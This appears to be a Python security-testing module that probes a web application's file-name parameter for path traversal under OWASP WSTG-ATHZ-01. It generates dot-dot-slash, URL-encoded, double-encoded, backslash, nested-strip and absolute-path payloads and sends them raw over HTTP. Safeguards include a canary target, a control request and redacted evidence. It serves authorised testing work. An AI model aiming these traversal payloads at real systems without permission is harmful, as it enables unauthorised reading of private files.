"""Probe a file-name parameter for path traversal, read-only, and prove it without printing the file (WSTG-ATHZ-01).

WSTG-ATHZ-01 tells the tester to enumerate the inputs used for file operations, then try each encoding of
``../`` ("It's a common mistake by developers to not expect every form of encoding"). This probe automates the
second step for one parameter and keeps it safe:

- the target is a *canary*: a harmless file outside the served folder that the system's owner agreed to. In the
  practice portal that is ``internal/settlement-keys.txt`` (synthetic).
- a hit needs two proofs: the answer is a 200 whose body is not the normal file, **and** the same payload aimed
  at a name that cannot exist is *not* a 200 - otherwise a catch-all page or an echo would look like file access.
- evidence is the status, the size and the first four characters, never the body.

``send`` takes the RAW query-string value (already percent-encoded where the probe wants it) and returns
``(status, body_text)``, so the same probe runs against the practice portal and against fakes.
"""

from __future__ import annotations

import http.client
import urllib.parse
from dataclasses import dataclass
from typing import Callable

Send = Callable[[str], tuple[int, str]]

CONTROL_SUFFIX = ".missing"  # appended to a payload to aim it at a name that cannot exist


class InconclusiveError(Exception):
    """The normal request is not a stable 200, so there is nothing to compare a payload against."""


@dataclass(frozen=True)
class Finding:
    variant: str  # the label from variants(), e.g. "url-encoded"
    value: str  # the raw value that worked
    status: int
    size: int
    evidence: str  # redact(body) - never the body itself


def variants(target: str) -> list[tuple[str, str]]:
    """``(label, raw_value)`` payloads that aim at ``target`` (a relative path such as ``internal/keys.txt``).

    In this order: ``dot-dot-slash`` (``../``), ``deep`` (four ``../`` - extra ones are harmless where the
    resolver stops at the root), ``url-encoded`` (``%2e%2e%2f`` and ``%2f`` for each slash), ``double-encoded``
    (``%252e%252e%252f``, ``%252f``), ``backslash`` (``..%5c``, ``%5c``), ``nested-strip`` (``....//``, which
    survives a filter that removes ``../`` once) and ``absolute`` (a leading ``/``).
    Raise ``ValueError`` if ``target`` is absolute or contains ``..``: the probe adds the climbing itself.
    """
    if target.startswith("/") or ".." in target:
        raise ValueError("target must be a relative path without '..'")
    return [
        ("dot-dot-slash", f"../{target}"),
        ("deep", f"../../../../{target}"),
        ("url-encoded", "%2e%2e%2f" + target.replace("/", "%2f")),
        ("double-encoded", "%252e%252e%252f" + target.replace("/", "%252f")),
        ("backslash", "..%5c" + target.replace("/", "%5c")),
        ("nested-strip", f"....//{target}"),
        ("absolute", f"/{target}"),
    ]


def redact(body: str) -> str:
    """Evidence that proves a file was read without copying it: its size and its first four characters."""
    return f"{len(body)} bytes, begins {body[:4]!r}..."


def probe_traversal(send: Send, legit_name: str, target: str) -> list[Finding]:
    """Every variant that reads ``target``; an empty list means none did.

    1. Send ``legit_name`` twice. Anything but the same non-empty 200 both times raises InconclusiveError.
    2. For each variant: it counts only if the answer is a 200 with a non-empty body that is not the baseline's
       body, **and** the same raw value plus ``CONTROL_SUFFIX`` is not a 200.
    3. Record a Finding with ``redact(body)`` as evidence.
    """
    first, second = send(legit_name), send(legit_name)
    if first != second or first[0] != 200 or not first[1]:
        raise InconclusiveError(f"{legit_name!r} is not a stable 200: {first[0]}, {second[0]}")
    baseline_body = first[1]
    findings = []
    for label, raw in variants(target):
        status, body = send(raw)
        if status != 200 or not body or body == baseline_body:
            continue
        control_status, _ = send(raw + CONTROL_SUFFIX)
        if control_status == 200:
            continue
        findings.append(Finding(label, raw, status, len(body), redact(body)))
    return findings


def portal_sender(base_url: str, path: str = "/files", parameter: str = "name", timeout: float = 5.0) -> Send:
    """A ``send`` for the practice portal that sends the raw value exactly as given (``http.client`` does not
    re-encode, unlike ``requests``, which would turn ``%2e`` back into ``.``)."""
    parts = urllib.parse.urlsplit(base_url)

    def send(raw: str) -> tuple[int, str]:
        conn = http.client.HTTPConnection(parts.hostname, parts.port, timeout=timeout)
        try:
            conn.request("GET", f"{path}?{parameter}={raw}")
            response = conn.getresponse()
            return response.status, response.read().decode(errors="replace")
        finally:
            conn.close()

    return send
